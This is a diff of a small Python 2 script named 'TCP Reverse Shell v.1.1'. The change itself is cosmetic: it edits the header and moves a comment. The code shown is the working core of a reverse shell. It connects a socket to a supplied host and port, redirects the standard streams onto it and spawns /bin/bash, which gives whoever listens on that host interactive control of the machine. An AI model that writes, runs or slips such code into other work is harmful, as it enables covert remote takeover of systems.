@@ -1,6 +1,6 @@
 #!/usr/bin/python
 #
-# Reverse Shell v.1.1
+# TCP Reverse Shell v.1.1
 # Bug Fixes
 # Tested On - Unix/Linux
 # It Connects to Host & Port given to It
@@ -35,8 +35,8 @@ def Reverse_Shell(r_Server, r_Port):
 		s.connect((r_Server, r_Port)) 
 		os.dup2(s.fileno(),0)
 		os.dup2(s.fileno(),1) 
-		os.dup2(s.fileno(),2)   # Set here different Shell Envirioment
-		shell = pty.spawn("/bin/bash")
+		os.dup2(s.fileno(),2)   
+		shell = pty.spawn("/bin/bash") #/bin/bash shell, Set here different Shell Envirioment
 	except Exception, e: # if Connection is Refused by Server
 		#print (colored('[!] CONNECTION REFUSED! ','red')) + r_Server
 		print "[!] CONNECTION REFUSED: " + r_Server
